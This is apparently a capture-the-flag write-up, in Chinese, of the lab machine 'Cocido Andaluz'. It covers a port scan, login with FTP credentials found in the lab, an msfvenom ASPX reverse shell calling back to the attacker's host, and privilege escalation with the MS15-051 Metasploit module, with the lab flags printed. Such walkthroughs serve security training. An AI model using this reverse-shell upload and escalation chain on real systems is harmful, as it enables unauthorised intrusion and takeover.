# Cocido Andaluz

2025.03.16 https://thehackerslabs.com/cocido-andaluz/

## Ip

192.168.5.40

## Scan

```
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
```

ftp 不允许匿名登陆，guest 用户不能访问 smb。

直接看 80 web 主页没信息，大字典扫描出目录 http://192.168.5.40/aspnet_client/ 但是里面什么都没扫到，这里行不通。

在看 ftp 能不能找到用户名进行爆破，主机屏幕上显示了一个 info 用户，密码 PolniyPizdec0211 。

进入 ftp 发现是 web 中显示的目录，这里直接生成 aspx 反弹 shell：

```
msfvenom -p windows/shell_reverse_tcp lhost=192.168.5.3 lport=8888 -f aspx -o shell.aspx
```

得到反弹的 shell，查看下用户:

```
c:\windows\system32\inetsrv>whoami
nt authority\servicio de red
```

有 SeImpersonatePrivilege 权限。

先读取到了 user flag：

```
c:\Users>type c:\users\info\user.txt
hdgrfvvf8s7dre5w7vg23rfewf
```

使用 msf 中的 local_exploit_suggester 中的 exploit/windows/local/ms15_051_client_copy_image 进行提权，拿到最终 root 权限：

```
type c:\\Users\\Administrador\\Desktop\\root.txt
hdgrfvv45478fhrfcdnc7vg2fw44f
```
